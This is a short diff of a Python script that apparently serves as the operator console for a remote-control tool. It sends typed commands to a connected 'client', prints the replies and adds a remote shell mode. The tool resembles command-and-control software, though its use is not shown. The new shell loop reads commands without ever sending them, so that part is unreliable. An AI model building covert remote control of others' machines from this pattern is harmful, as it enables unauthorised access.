@@ -20,23 +20,31 @@ def exit_server_session():
     except OSError: pass
     server_session = None
 
-def get_client_status():
+def get_client_path():
     if server_session == None: return ""
-    server_session.send("getstatusandpath")
-    return server_session.recv(1024).decode('utf-8').split("|")
+    server_session.send("getpath")
+    return server_session.recv(1024).decode('utf-8')
+
+def shell():
+    path = get_client_path()
+    while len(path):
+        command = input(f"{path}> ").strip()
+        path = get_client_path()
 
 def interact():
     status = server_session.recv(1024).decode('utf-8')
     if status == "clientnotfound":
         print("Client Not Found")
     else:
-        while status == "clientready":
+        while True:
             if server_session == None: return
-            status, path = get_client_status()
-            command = input(f"{path}> ").strip()
+            command = input("C> ").strip()
             if command == "exit":
                 server_session.send(command)
                 return
+            elif command == "shell":
+                server_session.send(command)
+                shell()
             else:
                 server_session.send(command)
                 print(server_session.recv(1024).decode('utf-8'))
